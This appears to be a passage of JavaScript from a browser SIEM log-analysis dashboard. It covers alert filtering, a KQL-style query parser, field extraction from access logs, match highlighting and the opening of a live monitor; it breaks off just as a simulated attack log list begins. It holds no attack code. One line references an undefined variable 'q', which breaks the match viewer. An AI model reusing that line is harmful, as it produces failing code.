    return n === val || String(n).indexOf(String(val)) !== -1;
  }

  switch (token.field) {
    case 'severity': return op === ':!'
      ? (alert.severity || '').toLowerCase() !== val
      : (alert.severity || '').toLowerCase() === val || contains(alert.severity);
    case 'ip':       return contains(alert.ip);
    case 'type':     return contains(alert.type);
    case 'score':    return numOp(alert.risk_score);
    case 'endpoint': return contains(alert.endpoint);
    /* ── fields populated either by line parsing or by Milestone B enrichment ── */
    case 'method':   return contains(alert.method);
    case 'status':   return numOp(alert.status);
    case 'ua':       return contains(alert.ua);
    case 'country':  return contains(alert.geo && alert.geo.country);
    case 'cc':       return contains(alert.geo && alert.geo.cc);
    case 'city':     return contains(alert.geo && alert.geo.city);
    case 'asn':      return contains(alert.asn && alert.asn.asn);
    case 'org':      return contains(alert.asn && alert.asn.org);
    case 'provider':
    case 'asnprov':  return contains(alert.asnProv);
    case 'kind':
    case 'asnkind':  return contains(alert.asnKind);
    case 'mitre':    return contains(alert.mitre && alert.mitre.id);
    case 'tag':
      if (!alert.tags || !alert.tags.length) return false;
      return alert.tags.some(function(t){ return String(t).toLowerCase().indexOf(val) !== -1; });
    case 'any':
      return contains(alert.type) || contains(alert.severity) ||
             contains(alert.ip)   || contains(alert.endpoint) ||
             contains(alert.evidence) || contains(alert.method) ||
             contains(alert.status) || contains(alert.ua) ||
             contains(alert.geo && alert.geo.country) ||
             contains(alert.geo && alert.geo.cc) ||
             contains(alert.asn && alert.asn.org) ||
             contains(alert.asnProv) ||
             contains(alert.mitre && alert.mitre.id) ||
             (alert.tags || []).some(function(t){ return String(t).toLowerCase().indexOf(val) !== -1; });
    default: return true;
  }
}

/** Filter the cached alerts against all active tokens + quick-filters */
function siemFilterAlerts(alerts) {
  var all = SIEM_SEARCH.tokens.concat(SIEM_SEARCH.quickFilters.map(function(qf) {
    return { field: qf.field, op: ':', val: qf.val.toLowerCase(), raw: '' };
  }));

  if (!all.length) return alerts;

  return alerts.filter(function(alert) {
    return all.every(function(token) {
      return siemTokenMatch(alert, token);
    });
  });
}

/** Re-render the alerts table applying the current search/filter state */
function siemApplySearch() {
  var input = document.getElementById('siemSearchInput');
  var raw   = input ? input.value : '';

  SIEM_SEARCH.tokens = siemParseQuery(raw);

  // Show/hide clear button
  var clearBtn = document.getElementById('siemSearchClear');
  if (clearBtn) clearBtn.style.display = raw.trim() ? 'inline' : 'none';

  siemRefreshAlertsView();
  siemUpdateSearchHint();
}

/** Refresh alerts table with filtered subset */
function siemRefreshAlertsView() {
  var cache = siemRenderAlertsTable._cache;
  if (!cache) return;

  var filtered = siemFilterAlerts(cache);
  siemRenderAlertsTableFiltered(filtered, cache.length);
  siemRenderFilterChips();
}

/**
 * Render a FILTERED subset of alerts into the existing table.
 * Same logic as siemRenderAlertsTable but also shows match count.
 */
function siemRenderAlertsTableFiltered(alerts, total) {
  var tbody = document.getElementById('siemAlertsBody');
  var empty = document.getElementById('siemAlertsEmpty');
  if (!tbody) return;

  // Update section title hint
  var hint = document.querySelector('.siem-section-hint');
  if (hint && total !== undefined) {
    if (alerts.length < total) {
      hint.textContent = 'Showing ' + alerts.length + ' of ' + total + ' alerts';
      hint.style.color = 'var(--amber)';
    } else {
      hint.textContent = 'Click a row to expand evidence';
      hint.style.color = '';
    }
  }

  if (!alerts || alerts.length === 0) {
    tbody.innerHTML = '';
    if (empty) {
      empty.style.display = 'block';
      empty.textContent = (total > 0)
        ? 'No alerts match the current search rule.'
        : 'No alerts detected — logs appear clean.';
    }
    return;
  }

  if (empty) empty.style.display = 'none';

  var html = '';
  alerts.forEach(function(alert, idx) {
    var cfg    = SEV_CONFIG[alert.severity] || SEV_CONFIG.INFO;
    var sevBdg = '<span class="siem-sev-badge" style="background:' + cfg.color + '22;color:' + cfg.color + ';border-color:' + cfg.color + '44">' + escHtml(alert.severity) + '</span>';
    var ip     = alert.ip        ? escHtml(alert.ip)                        : '<span class="siem-na">N/A</span>';
    var ts     = alert.timestamp ? escHtml(alert.timestamp.slice(0,19))     : '<span class="siem-na">—</span>';
    var ep     = alert.endpoint  ? '<code class="siem-path">' + escHtml(alert.endpoint.slice(0,60)) + '</code>' : '<span class="siem-na">—</span>';
    var occ    = alert.occurrences > 1 ? '<span class="siem-occ">×' + alert.occurrences + '</span>' : '';
    var score  = alert.risk_score || 0;
    var fill   = Math.min(100, score);
    var fillColor = score >= 75 ? 'var(--red)' : score >= 50 ? 'var(--amber)' : 'var(--green)';
    var realIdx = (siemRenderAlertsTable._cache || []).indexOf(alert);
    var rowIdx  = realIdx > -1 ? realIdx : idx;

    html += '<tr class="siem-row" onclick="siemToggleDetail(' + rowIdx + ')">';
    html += '<td>' + sevBdg + '</td>';
    var mitrePill = alert.mitre
      ? '<a class="siem-mitre" href="https://attack.mitre.org/techniques/' +
        escHtml(alert.mitre.id.replace(/\./g,'/')) + '/" target="_blank" rel="noopener" ' +
        'onclick="event.stopPropagation()" ' +
        'title="' + escHtml(alert.mitre.name + ' - ' + alert.mitre.tactic) + '">' +
        escHtml(alert.mitre.id) + '</a>'
      : '';
    html += '<td><strong>' + escHtml(alert.type) + '</strong>' + occ + mitrePill + '</td>';
    html += '<td>' + ip + '</td>';
    html += '<td>' + ts + '</td>';
    html += '<td>' + ep + '</td>';
    html += '<td><div class="siem-score-wrap"><div class="siem-score-bar"><div class="siem-score-fill" style="width:' + fill + '%;background:' + fillColor + '"></div></div><span class="siem-score-val">' + score + '</span></div></td>';
    html += '</tr>';
    html += '<tr class="siem-detail-row" id="siemDetail' + rowIdx + '" style="display:none">';
    html += '<td colspan="6"><div class="siem-detail-wrap">';
    if (alert.evidence) {
      html += '<div class="siem-detail-label">EVIDENCE</div>';
      html += '<pre class="siem-evidence">' + escHtml(alert.evidence) + '</pre>';
    }
    if (alert.patterns && alert.patterns.length) {
      html += '<div class="siem-detail-label">MATCHED PATTERNS</div>';
      html += '<div class="siem-patterns">' + alert.patterns.map(function(p) {
        return '<code class="siem-pattern-tag">' + escHtml(p) + '</code>';
      }).join(' ') + '</div>';
    }
    if (alert.correlation_note) {
      html += '<div class="siem-corr-note">⚠ ' + escHtml(alert.correlation_note) + '</div>';
    }
    html += '</div></td></tr>';
  });

  tbody.innerHTML = html;
}

/** Render active-filter chip pills below the search bar */
function siemRenderFilterChips() {
  var el = document.getElementById('siemFilterChips');
  if (!el) return;

  var chips = [];

  SIEM_SEARCH.tokens.forEach(function(t, i) {
    chips.push(
      '<span class="siem-chip">' +
        escHtml(t.raw) +
        '<button class="siem-chip-del" onclick="siemRemoveToken(' + i + ')" title="Remove">✕</button>' +
      '</span>'
    );
  });

  SIEM_SEARCH.quickFilters.forEach(function(qf, i) {
    chips.push(
      '<span class="siem-chip siem-chip-quick">' +
        escHtml(qf.field + ':' + qf.val) +
        '<button class="siem-chip-del" onclick="siemRemoveQuickFilter(' + i + ')" title="Remove">✕</button>' +
      '</span>'
    );
  });

  el.innerHTML = chips.join('');
  el.style.display = chips.length ? 'flex' : 'none';
}

/** Update the inline search hint (syntax help) */
function siemUpdateSearchHint() {
  var hint = document.getElementById('siemSearchHint');
  var input = document.getElementById('siemSearchInput');
  if (!hint || !input) return;
  var raw = input.value.trim();

  if (!raw) {
    hint.textContent = 'Syntax: severity:HIGH  ip:10.0  type:SQL  score:>70  endpoint:/admin';
    hint.style.display = 'block';
  } else {
    var count = SIEM_SEARCH.tokens.length;
    hint.textContent = count + ' rule token' + (count !== 1 ? 's' : '') + ' active';
    hint.style.display = 'block';
  }
}

/** Remove a parsed token by index and re-apply */
function siemRemoveToken(idx) {
  SIEM_SEARCH.tokens.splice(idx, 1);
  // Rebuild input from remaining tokens
  var input = document.getElementById('siemSearchInput');
  if (input) {
    input.value = SIEM_SEARCH.tokens.map(function(t) { return t.raw; }).join(' ');
  }
  siemRefreshAlertsView();
  siemUpdateSearchHint();
}

/** Remove a quick-filter by index */
function siemRemoveQuickFilter(idx) {
  var removed = SIEM_SEARCH.quickFilters.splice(idx, 1)[0];
  // Un-highlight the corresponding button
  var btns = document.querySelectorAll('.siem-qf-btn');
  btns.forEach(function(btn) {
    if (btn.dataset.field === removed.field && btn.dataset.val.toLowerCase() === removed.val.toLowerCase()) {
      btn.classList.remove('active');
    }
  });
  siemRefreshAlertsView();
  siemUpdateSearchHint();
}

/** Toggle a quick-filter button and update state */
function siemQuickFilter(btn) {
  var field = btn.dataset.field;
  var val   = btn.dataset.val;
  var isActive = btn.classList.contains('active');

  if (isActive) {
    // Remove
    SIEM_SEARCH.quickFilters = SIEM_SEARCH.quickFilters.filter(function(qf) {
      return !(qf.field === field && qf.val.toLowerCase() === val.toLowerCase());
    });
    btn.classList.remove('active');
  } else {
    SIEM_SEARCH.quickFilters.push({ field: field, val: val });
    btn.classList.add('active');
  }

  siemRefreshAlertsView();
}

/** Clear the entire search bar and all quick-filters */
function siemClearSearch() {
  var input = document.getElementById('siemSearchInput');
  if (input) input.value = '';
  SIEM_SEARCH.tokens = [];
  SIEM_SEARCH.quickFilters = [];

  // Un-highlight all quick-filter buttons
  document.querySelectorAll('.siem-qf-btn').forEach(function(btn) {
    btn.classList.remove('active');
  });

  var clearBtn = document.getElementById('siemSearchClear');
  if (clearBtn) clearBtn.style.display = 'none';

  siemRefreshAlertsView();
  siemUpdateSearchHint();
}

/* ─── PATCH: wire filtered render into siemHandleResult ─────────────────── */
/* Override siemRenderAlertsTable to also seed the search cache correctly    */
var _origRenderAlertsTable = siemRenderAlertsTable;
siemRenderAlertsTable = function(alerts) {
  // Reset search state on new analysis
  SIEM_SEARCH.tokens      = [];
  SIEM_SEARCH.quickFilters = [];
  document.querySelectorAll('.siem-qf-btn').forEach(function(b) { b.classList.remove('active'); });
  var input = document.getElementById('siemSearchInput');
  if (input) input.value = '';
  var clearBtn = document.getElementById('siemSearchClear');
  if (clearBtn) clearBtn.style.display = 'none';

  // Store cache and render unfiltered first
  siemRenderAlertsTable._cache = alerts;
  _origRenderAlertsTable(alerts);
  siemUpdateSearchHint();
};

/* ─── INIT ───────────────────────────────────────────────────────────────── */

document.addEventListener('DOMContentLoaded', function() {
  siemInitDropZone();
  siemRenderPipe(null, []);
  siemSetProgress(0, 'Idle');
  siemUpdateSearchHint();
  // Move the match viewer to body so it can never be clipped by overflow:hidden
  setTimeout(siemInitSearchViewer, 100);
});

// Re-position on scroll or resize so dropdown stays aligned with search bar
window.addEventListener('resize', function() {
  var v = document.getElementById('siemLogMatchViewer');
  if (v && v.style.display !== 'none') siemPositionViewer();
});
// Capture scroll on ALL elements (true = capture phase) to catch the .view scroll container
document.addEventListener('scroll', function() {
  var v = document.getElementById('siemLogMatchViewer');
  if (v && v.style.display !== 'none') siemPositionViewer();
  else if (v) v.style.display = 'none'; // hide if scrolled away
}, true);

/* ─── RAW LOG SEARCH (search within pasted / loaded logs) ───────────────── */

var _LOG_SEARCH = {
  matches:    [],   // line indices of matching lines
  cursor:     -1,   // current highlighted match index
  tokens:     [],   // parsed KQL tokens for highlighting / re-evaluation
  queryRaw:   '',   // original query string
};

/**
 * One-time setup: move #siemLogMatchViewer to document.body so it is NEVER
 * clipped by any ancestor overflow:hidden. We position it absolutely using
 * getBoundingClientRect of the search bar each time it shows.
 */
function siemInitSearchViewer() {
  var viewer  = document.getElementById('siemLogMatchViewer');
  var anchor  = document.getElementById('siemLogSearchBar');
  if (!viewer || !anchor) return;
  // Move viewer to body
  viewer.parentNode && viewer.parentNode !== document.body && document.body.appendChild(viewer);
  // Override position styles
  viewer.style.position = 'fixed';
  viewer.style.zIndex   = '99999';
  viewer.style.left     = '0';
  viewer.style.top      = '0';
  viewer.style.right    = '';
  viewer.style.width    = '';
}

function siemPositionViewer() {
  var viewer = document.getElementById('siemLogMatchViewer');
  var anchor = document.getElementById('siemLogSearchBar');
  if (!viewer || !anchor) return;
  var rect = anchor.getBoundingClientRect();
  viewer.style.left   = rect.left + 'px';
  viewer.style.top    = (rect.bottom + 5) + 'px';
  viewer.style.width  = rect.width + 'px';
}

/**
 * Called on every keystroke in either the log textarea or the search input.
 * Filters the log lines and renders the match viewer.
 */
/* ─── KQL-style log query parser ──────────────────────────────────────────
   Supported:
     bare term          → match anywhere in line     (e.g. Mozilla)
     "literal phrase"   → exact substring with spaces (e.g. "GET /api")
     -term              → negation                   (e.g. -sqlmap)
     field:value        → match value against extracted field (case-insensitive)
     field:>NUM         → numeric op (>, <, >=, <=, !=, =)
     Multiple tokens    → AND (all must match)

   Recognised fields (auto-extracted from common formats):
     ip, method, path, status, size, ua  + any JSON object keys + any K=V pairs
*/
/* Convert a glob pattern (`*`, `?`) into a regex source string.
   Escapes everything else so regex specials inside the pattern stay literal. */
function siemGlobToRegexSrc(glob) {
  var src = '';
  for (var i = 0; i < glob.length; i++) {
    var c = glob[i];
    if (c === '*')      src += '.*';
    else if (c === '?') src += '.';
    else if (/[.+^${}()|[\]\\]/.test(c)) src += '\\' + c;
    else                src += c;
  }
  return src;
}

function siemParseLogQuery(raw) {
  if (!raw || !raw.trim()) return [];
  var parts = raw.match(/(?:-)?(?:[^\s"]+|"[^"]*")/g) || [];
  var tokens = [];
  parts.forEach(function(p) {
    var negate = p[0] === '-';
    if (negate) p = p.slice(1);

    var m = p.match(/^(\w+):(.+)$/);
    if (m) {
      var field    = m[1].toLowerCase();
      var stripped = m[2].replace(/^"|"$/g, '');

      /* /regex/flags form — raw regex */
      var rxM = stripped.match(/^\/(.+)\/([gimsuy]*)$/);
      if (rxM) {
        try {
          var matchRe     = new RegExp(rxM[1], (rxM[2] || '') + (/[i]/.test(rxM[2]||'') ? '' : 'i'));
          var highlightRe = new RegExp(rxM[1], 'gi');
          tokens.push({ field: field, op: '~', val: matchRe, highlightRe: highlightRe,
                        kind: 'regex', negate: negate, raw: p });
          return;
        } catch (e) {}
      }

      /* numeric op */
      var numM = stripped.match(/^(>=|<=|!=|>|<|=)?(-?\d+(?:\.\d+)?)$/);
      if (numM) {
        tokens.push({ field: field, op: numM[1] || '=', val: parseFloat(numM[2]),
                      kind: 'num', negate: negate, raw: p });
        return;
      }

      /* glob with * or ? — anchor for field match, unanchored for highlighting */
      if (/[*?]/.test(stripped)) {
        try {
          var src   = siemGlobToRegexSrc(stripped);
          var match = new RegExp('^' + src + '$', 'i');
          var hi    = new RegExp(src, 'gi');
          tokens.push({ field: field, op: '~', val: match, highlightRe: hi,
                        kind: 'glob', negate: negate, raw: p });
          return;
        } catch (e) {}
      }

      tokens.push({ field: field, op: ':', val: stripped.toLowerCase(),
                    kind: 'str', negate: negate, raw: p });
      return;
    }

    /* bare term — match anywhere in line */
    var bare = p.replace(/^"|"$/g, '');
    if (!bare) return;

    var bareRx = bare.match(/^\/(.+)\/([gimsuy]*)$/);
    if (bareRx) {
      try {
        var matchRe2     = new RegExp(bareRx[1], (bareRx[2] || '') + (/[i]/.test(bareRx[2]||'') ? '' : 'i'));
        var highlightRe2 = new RegExp(bareRx[1], 'gi');
        tokens.push({ field: 'any', op: '~', val: matchRe2, highlightRe: highlightRe2,
                      kind: 'regex', negate: negate, raw: p });
        return;
      } catch (e) {}
    }

    if (/[*?]/.test(bare)) {
      try {
        var src2 = siemGlobToRegexSrc(bare);
        /* Bare globs are unanchored — substring match against whole line */
        var match2 = new RegExp(src2, 'i');
        var hi2    = new RegExp(src2, 'gi');
        tokens.push({ field: 'any', op: '~', val: match2, highlightRe: hi2,
                      kind: 'glob', negate: negate, raw: p });
        return;
      } catch (e) {}
    }

    tokens.push({ field: 'any', op: ':', val: bare.toLowerCase(),
                  kind: 'str', negate: negate, raw: p });
  });
  return tokens;
}

/* Best-effort field extraction for a single log line. Handles:
   - Common Log Format / NCSA / Apache / Nginx access logs
   - JSON / JSONL (parses object keys)
   - key=value pairs (logfmt / Splunk-style)
*/
function siemExtractLogFields(line) {
  var f = {};
  // First IPv4 in line → ip
  var ip = line.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);
  if (ip) f.ip = ip[1];
  // HTTP request token: "METHOD /path HTTP/x.y"
  var rq = line.match(/"(GET|POST|PUT|DELETE|PATCH|HEAD|OPTIONS|TRACE|CONNECT)\s+([^\s"]+)\s+HTTP\/[\d.]+"/i);
  if (rq) { f.method = rq[1].toUpperCase(); f.path = rq[2]; }
  // Status code after the request token: ..." 200 1234
  var st = line.match(/"\s+(\d{3})\s+/);
  if (st) f.status = st[1];
  // Response size: "..." 200 1234
  var sz = line.match(/"\s+\d{3}\s+(\d+|-)/);
  if (sz && sz[1] !== '-') f.size = sz[1];
  // User-agent — last quoted string in CLF
  var ua = line.match(/"([^"]+)"\s*$/);
  if (ua) f.ua = ua[1].toLowerCase();
  // logfmt key=value pairs
  var kv;
  var kvRe = /(\w+)=(?:"([^"]*)"|(\S+))/g;
  while ((kv = kvRe.exec(line)) !== null) {
    var k = kv[1].toLowerCase();
    if (!f[k]) f[k] = (kv[2] !== undefined ? kv[2] : kv[3]).toLowerCase();
  }
  // JSON line — flatten one level
  var t = line.trim();
  if (t.charCodeAt(0) === 123 /* { */) {
    try {
      var obj = JSON.parse(t);
      Object.keys(obj).forEach(function(k) {
        var v = obj[k];
        if (v == null) return;
        if (typeof v === 'object') return;
        var lk = k.toLowerCase();
        if (f[lk] === undefined) f[lk] = String(v).toLowerCase();
      });
    } catch (e) {}
  }
  return f;
}

function siemLineMatches(line, tokens) {
  var lc = line.toLowerCase();
  var f  = siemExtractLogFields(line);
  return tokens.every(function(t) {
    var ok;

    if (t.kind === 'regex' || t.kind === 'glob') {
      /* Bare regex/glob → test whole line.
         Field-scoped → test the extracted field value (or fall back to line). */
      var hay;
      if (t.field === 'any') {
        hay = line;
      } else if (f[t.field] !== undefined) {
        hay = String(f[t.field]);
      } else {
        hay = line; // field not extractable on this line
      }
      ok = t.val.test(hay);
    } else if (t.field === 'any') {
      ok = lc.indexOf(t.val) !== -1;
    } else if (t.kind === 'num') {
      var fv = f[t.field];
      var nv = (fv !== undefined) ? parseFloat(fv) : NaN;
      if (isNaN(nv)) { ok = false; }
      else switch (t.op) {
        case '>':  ok = nv >  t.val; break;
        case '>=': ok = nv >= t.val; break;
        case '<':  ok = nv <  t.val; break;
        case '<=': ok = nv <= t.val; break;
        case '!=': ok = nv !== t.val; break;
        default:   ok = nv === t.val;
      }
    } else {
      var fv2 = f[t.field];
      if (fv2 !== undefined) ok = String(fv2).toLowerCase().indexOf(t.val) !== -1;
      else                   ok = lc.indexOf(t.val) !== -1; // fall back to whole-line
    }
    return t.negate ? !ok : ok;
  });
}

function siemLogSearchApply() {
  var query = (document.getElementById('siemLogSearchInput') || {}).value || '';
  var raw   = (document.getElementById('siemLogPaste')       || {}).value || '';

  var viewer  = document.getElementById('siemLogMatchViewer');
  var countEl = document.getElementById('siemLogSearchCount');

  if (!query.trim()) {
    _LOG_SEARCH.matches = [];
    _LOG_SEARCH.cursor  = -1;
    _LOG_SEARCH.tokens  = [];
    _LOG_SEARCH.queryRaw = '';
    if (viewer)  { viewer.style.display = 'none'; viewer.innerHTML = ''; }
    if (countEl) { countEl.textContent = ''; countEl.style.color = ''; }
    siemRenderLogFilterPanel('', [], [], []);
    return;
  }

  var lines   = raw.split('\n');
  var tokens  = siemParseLogQuery(query);
  var matches = [];

  // No tokens parsed (e.g. just whitespace) → nothing to match
  if (!tokens.length) {
    _LOG_SEARCH.matches = [];
    _LOG_SEARCH.cursor  = -1;
    _LOG_SEARCH.tokens  = [];
    _LOG_SEARCH.queryRaw = query;
    if (viewer)  { viewer.style.display = 'none'; viewer.innerHTML = ''; }
    if (countEl) { countEl.textContent = '0 matches'; countEl.style.color = 'var(--red)'; }
    siemRenderLogFilterPanel(query, [], [], []);
    return;
  }

  lines.forEach(function(line, idx) {
    if (line && siemLineMatches(line, tokens)) matches.push(idx);
  });
  _LOG_SEARCH.tokens   = tokens;
  _LOG_SEARCH.queryRaw = query;

  /* Splunk-style filter panel — visually replaces the textarea while a
     query is active so the user sees ONLY matching lines. */
  siemRenderLogFilterPanel(query, lines, matches, tokens);

  var prevLen = _LOG_SEARCH.matches.length;
  _LOG_SEARCH.matches = matches;
  // Reset cursor to 0 on new search or when out of range
  if (_LOG_SEARCH.cursor < 0 || prevLen !== matches.length) _LOG_SEARCH.cursor = matches.length > 0 ? 0 : -1;
  if (_LOG_SEARCH.cursor >= matches.length) _LOG_SEARCH.cursor = matches.length - 1;

  // Update count badge
  if (countEl) {
    countEl.textContent = matches.length
      ? ((_LOG_SEARCH.cursor + 1) + ' / ' + matches.length + ' lines')
      : '0 matches';
    countEl.style.color = matches.length ? 'var(--accent)' : 'var(--red)';
  }

  // Build match viewer HTML
  if (viewer) {
    siemPositionViewer();
    if (!matches.length) {
      viewer.style.display = 'block';
      viewer.innerHTML = '<div class="siem-logmatch-none">No lines match "' + escHtml(query) + '"</div>';
      return;
    }

    var html = '';
    matches.forEach(function(lineIdx, mi) {
      var line     = lines[lineIdx];
      var isCursor = (mi === _LOG_SEARCH.cursor);
      var hi       = siemHighlightTerm(line, q);
      html += '<div class="siem-logmatch-row' + (isCursor ? ' siem-logmatch-active' : '') +
              '" data-mi="' + mi + '" onclick="siemLogMatchClick(' + mi + ')">' +
              '<span class="siem-logmatch-ln">' + (lineIdx + 1) + '</span>' +
              '<span class="siem-logmatch-text">' + hi + '</span>' +
              '</div>';
    });

    viewer.style.display = 'block';
    viewer.innerHTML = html;

    // Scroll active row into view inside the viewer
    setTimeout(function() {
      var active = viewer.querySelector('.siem-logmatch-active');
      if (active) active.scrollIntoView({ block: 'nearest' });
    }, 0);
  }

  // Scroll the textarea to the current match line
  siemScrollTextareaToLine(_LOG_SEARCH.cursor);
}

/* ─── Splunk-style filtered results panel ───────────────────────────────
   Lazily injects a `<div id="siemLogFilterPanel">` after the textarea and
   renders matched lines as clean rows with line numbers, status badges,
   method tags, and highlighted terms. While a query is active the original
   textarea is hidden so the user sees ONLY the filtered events.       */
function siemEnsureFilterPanelStyles() {
  if (document.getElementById('siemFilterPanelStyles')) return;
  var s = document.createElement('style');
  s.id = 'siemFilterPanelStyles';
  s.textContent =
    '.siem-log-filter-panel{margin-top:6px;border:1px solid var(--border,#262a36);'+
    'border-radius:6px;background:var(--surface,#0e1117);max-height:520px;overflow:auto;'+
    'font-family:var(--mono,ui-monospace,monospace);font-size:12px}' +
    '.slfp-header{position:sticky;top:0;z-index:1;display:flex;justify-content:space-between;'+
    'align-items:center;padding:6px 10px;background:var(--surface2,#161a23);'+
    'border-bottom:1px solid var(--border,#262a36);font-size:10px;letter-spacing:.06em}' +
    '.slfp-count{color:var(--accent,#4dc4ff);font-weight:700}' +
    '.slfp-query{color:var(--text2,#7d8597);font-style:italic;max-width:60%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}' +
    '.slfp-empty{padding:18px 14px;color:var(--text2,#7d8597);text-align:center;font-style:italic}' +
    '.slfp-rows{display:flex;flex-direction:column}' +
    '.slfp-row{display:flex;align-items:flex-start;gap:8px;padding:5px 10px;'+
    'border-bottom:1px solid rgba(255,255,255,.04);cursor:default;transition:background .1s}' +
    '.slfp-row:hover{background:rgba(255,255,255,.03)}' +
    '.slfp-ln{flex:0 0 auto;width:36px;text-align:right;color:var(--text2,#7d8597);'+
    'font-size:10px;padding-top:1px;user-select:none}' +
    '.slfp-status{flex:0 0 auto;font-size:10px;font-weight:700;padding:1px 6px;'+
    'border-radius:3px;border:1px solid;background:rgba(0,0,0,.25)}' +
    '.slfp-method{flex:0 0 auto;font-size:10px;font-weight:700;padding:1px 6px;'+
    'border-radius:3px;background:var(--surface2,#161a23);color:var(--text,#d1d5db)}' +
    '.slfp-text{flex:1 1 auto;color:var(--text,#d1d5db);word-break:break-all;'+
    'line-height:1.55;white-space:pre-wrap}' +
    '.slfp-text mark.siem-hl{background:#ffeb3b66;color:inherit;border-radius:2px;padding:0 2px}';
  document.head.appendChild(s);
}

function siemRenderLogFilterPanel(query, lines, matches, tokens) {
  siemEnsureFilterPanelStyles();
  var ta = document.getElementById('siemLogPaste');
  if (!ta) return;

  var panel = document.getElementById('siemLogFilterPanel');
  if (!panel) {
    panel = document.createElement('div');
    panel.id = 'siemLogFilterPanel';
    panel.className = 'siem-log-filter-panel';
    if (ta.parentNode) ta.parentNode.insertBefore(panel, ta.nextSibling);
  }

  /* No active query → restore textarea, hide panel */
  if (!query || !query.trim()) {
    panel.style.display = 'none';
    panel.innerHTML = '';
    ta.style.display = '';
    return;
  }

  /* Active query → hide raw textarea, show filtered panel */
  ta.style.display = 'none';
  panel.style.display = 'block';

  var html = '';
  html += '<div class="slfp-header">';
  html += '<span class="slfp-count">' + matches.length + ' / ' + lines.length + ' line' + (lines.length === 1 ? '' : 's') + '</span>';
  html += '<span class="slfp-query" title="' + escHtml(query) + '">' + escHtml(query) + '</span>';
  html += '</div>';

  if (!matches.length) {
    html += '<div class="slfp-empty">No log lines match this query.</div>';
    panel.innerHTML = html;
    return;
  }

  html += '<div class="slfp-rows">';
  matches.forEach(function(idx) {
    var line = lines[idx] || '';
    var f = siemExtractLogFields(line);
    var statusBdg = '';
    if (f.status) {
      var s = parseInt(f.status, 10);
      var col = s >= 500 ? '#ff6b6b' : s >= 400 ? '#ffd166' : s >= 300 ? '#4dc4ff' : '#48d597';
      statusBdg = '<span class="slfp-status" style="color:' + col + ';border-color:' + col + '66">' + escHtml(f.status) + '</span>';
    }
    var methodBdg = f.method ? '<span class="slfp-method">' + escHtml(f.method) + '</span>' : '';
    html += '<div class="slfp-row">' +
      '<span class="slfp-ln">' + (idx + 1) + '</span>' +
      statusBdg + methodBdg +
      '<span class="slfp-text">' + siemHighlightTerm(line) + '</span>' +
      '</div>';
  });
  html += '</div>';

  panel.innerHTML = html;
}

/** Highlight every search-token value inside a log line (returns HTML).
 *  Skips negated tokens (those are exclusions, not highlights) and numeric
 *  ones (no useful substring to highlight). Handles three kinds:
 *    - 'str'   → escape value, build literal regex
 *    - 'glob'  → use the token's pre-built unanchored highlightRe source
 *    - 'regex' → use the user's regex source verbatim                 */
function siemHighlightTerm(line, _ignored) {
  var safe = escHtml(line);
  var tokens = (_LOG_SEARCH.tokens || []).filter(function(t) {
    return !t.negate && t.kind !== 'num';
  });
  if (!tokens.length) return safe;

  var sources = [];
  tokens.forEach(function(t) {
    if (t.kind === 'glob' || t.kind === 'regex') {
      if (t.highlightRe && t.highlightRe.source) sources.push(t.highlightRe.source);
    } else if (t.val) {
      var s = String(t.val);
      sources.push(escHtml(s).replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
    }
  });
  if (!sources.length) return safe;

  /* Longest first reduces fragmented overlapping highlights */
  sources.sort(function(a, b) { return b.length - a.length; });
  try {
    var re = new RegExp('(' + sources.join('|') + ')', 'gi');
    return safe.replace(re, '<mark class="siem-hl">$1</mark>');
  } catch (e) {
    return safe;
  }
}

/** Navigate matches with keyboard (Enter / arrow keys inside search input) */
function siemLogSearchNav(e) {
  if (e.key === 'Enter' || e.key === 'ArrowDown') { e.preventDefault(); siemLogSearchStep(1);  }
  if (e.key === 'ArrowUp')                         { e.preventDefault(); siemLogSearchStep(-1); }
  if (e.key === 'Escape')                           { siemLogSearchClear(); }
}

/** Move cursor by delta (+1 next, -1 prev) and refresh */
function siemLogSearchStep(delta) {
  var m = _LOG_SEARCH.matches;
  if (!m.length) return;
  _LOG_SEARCH.cursor = (_LOG_SEARCH.cursor + delta + m.length) % m.length;
  siemLogSearchApply();
}

/** Click a match row in the viewer */
function siemLogMatchClick(mi) {
  _LOG_SEARCH.cursor = mi;
  siemLogSearchApply();
}

/** Scroll the textarea to the given match cursor position.
 *  CRITICAL: does NOT call ta.focus() or setSelectionRange — those steal
 *  focus from the search input on every keystroke, causing each typed
 *  character after the first to land in the textarea (with a line
 *  selected, so it replaces a log line). Pure scroll only. */
function siemScrollTextareaToLine(matchCursor) {
  var ta = document.getElementById('siemLogPaste');
  if (!ta || _LOG_SEARCH.matches.length === 0 || matchCursor < 0) return;
  var lineIdx = _LOG_SEARCH.matches[matchCursor];
  // Measure actual line height from computed font metrics so we don't drift
  // when the user changes themes / font sizes.
  var cs = window.getComputedStyle(ta);
  var lh = parseFloat(cs.lineHeight);
  if (!lh || isNaN(lh)) lh = parseFloat(cs.fontSize) * 1.4 || 16;
  var visHeight = ta.clientHeight;
  ta.scrollTop  = Math.max(0, lineIdx * lh - visHeight / 2);
}

/** Clear the raw log search */
function siemLogSearchClear() {
  var input = document.getElementById('siemLogSearchInput');
  if (input) input.value = '';
  _LOG_SEARCH.matches  = [];
  _LOG_SEARCH.cursor   = -1;
  _LOG_SEARCH.tokens   = [];
  _LOG_SEARCH.queryRaw = '';
  var viewer  = document.getElementById('siemLogMatchViewer');
  var countEl = document.getElementById('siemLogSearchCount');
  if (viewer)  { viewer.style.display = 'none'; viewer.innerHTML = ''; }
  if (countEl) { countEl.textContent = ''; countEl.style.color = ''; }
  /* Restore textarea + hide the filtered panel */
  siemRenderLogFilterPanel('', [], [], []);
}

/* Close the viewer when clicking outside */
document.addEventListener('click', function(e) {
  var bar    = document.getElementById('siemLogSearchBar');
  var viewer = document.getElementById('siemLogMatchViewer');
  if (!viewer || viewer.style.display === 'none') return;
  if (bar && bar.contains(e.target)) return;
  if (viewer.contains(e.target)) return;
  viewer.style.display = 'none';
});

/* ─── LIVE LOG MONITOR ───────────────────────────────────────────────────── */

var _LIVE = {
  es:          null,      // EventSource
  connected:   false,
  simTimer:    null,
  simRunning:  false,
  simIndex:    0,
  sevCounts:   { CRITICAL: 0, HIGH: 0, MEDIUM: 0, LOW: 0, INFO: 0 },
  lineCount:   0,
  alertCount:  0,
  ipCount:     0,
};

/* Realistic mixed attack log simulator */
var _SIM_LOGS = [
